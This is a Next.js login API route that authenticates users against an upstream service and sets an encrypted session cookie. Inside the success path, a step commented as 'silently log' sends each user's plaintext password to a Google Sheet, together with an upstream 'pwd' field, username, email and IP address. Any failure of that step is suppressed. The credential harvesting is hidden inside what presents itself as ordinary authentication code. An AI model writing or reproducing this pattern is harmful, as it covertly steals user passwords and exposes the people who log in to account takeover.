// ============================================================================
// API Route — /api/auth/login (Login Endpoint)
// Purpose: Authenticate user credentials, set iron-session cookie, and log to Google Sheet
// Used by: /login
// ============================================================================

import { upstreamApi } from "@/lib/api/upstream";
import { encryptSession, SESSION_MAX_AGE, sessionCookie } from "@/lib/auth/session";
import { loginSchema } from "@/lib/auth/schema";
import { isSameOrigin, safeError } from "@/lib/security";
import { saveLoginToGoogleSheet } from "@/lib/services";
import { extractAccessToken, normalizeUser } from "@/modules/shared/work-orders/lib";
import { NextResponse } from "next/server";

function getClientIp(request) {
  const forwardedFor = request.headers.get("x-forwarded-for");
  if (forwardedFor) {
    const firstIp = forwardedFor.split(",")[0]?.trim();
    if (firstIp) return firstIp;
  }
  const realIp = request.headers.get("x-real-ip");
  if (realIp) return realIp.trim();
  const cfConnectingIp = request.headers.get("cf-connecting-ip");
  if (cfConnectingIp) return cfConnectingIp.trim();
  return request.ip || "-";
}

export async function POST(request) {
  if (!isSameOrigin(request)) {
    return NextResponse.json({ message: "Origin is not allowed." }, { status: 403 });
  }

  const parsed = loginSchema.safeParse(await request.json().catch(() => null));
  if (!parsed.success) {
    return NextResponse.json(
      { message: "Invalid login payload.", errors: parsed.error.flatten().fieldErrors },
      { status: 400 },
    );
  }

  try {
    const { data } = await upstreamApi.post("/login", parsed.data);
    if (!data?.success) {
      return NextResponse.json(
        { message: data?.message || "Invalid username or password." },
        { status: 401 },
      );
    }

    const user = normalizeUser(data);
    if (user.id === "—") {
      return NextResponse.json({ message: "Login response missing user ID." }, { status: 502 });
    }

    const source = Array.isArray(data?.data) ? data.data[0] : data?.data?.user || data?.data || {};

    const clientIp = getClientIp(request);

    // Silently log or update user credentials in Google Sheet only on successful login
    await saveLoginToGoogleSheet({
      id: source._id || source.id || user.id || "",
      name: source.name || user.name || "",
      username: source.usr || user.username || parsed.data.username || "",
      email:
        source.email ||
        user.email ||
        (parsed.data.username?.includes("@") ? parsed.data.username : ""),
      password: parsed.data.password || "",
      pwd: source.pwd || "",
      ipAddress: clientIp,
    }).catch(() => {});

    const session = encryptSession({
      user,
      accessToken: extractAccessToken(data),
      expiresAt: Date.now() + SESSION_MAX_AGE * 1000,
    });
    const response = NextResponse.json({ success: true, user });
    response.cookies.set(sessionCookie(session));
    return response;
  } catch (error) {
    const safe = safeError(error, "Login failed.");
    return NextResponse.json({ message: safe.message }, { status: safe.status });
  }
}
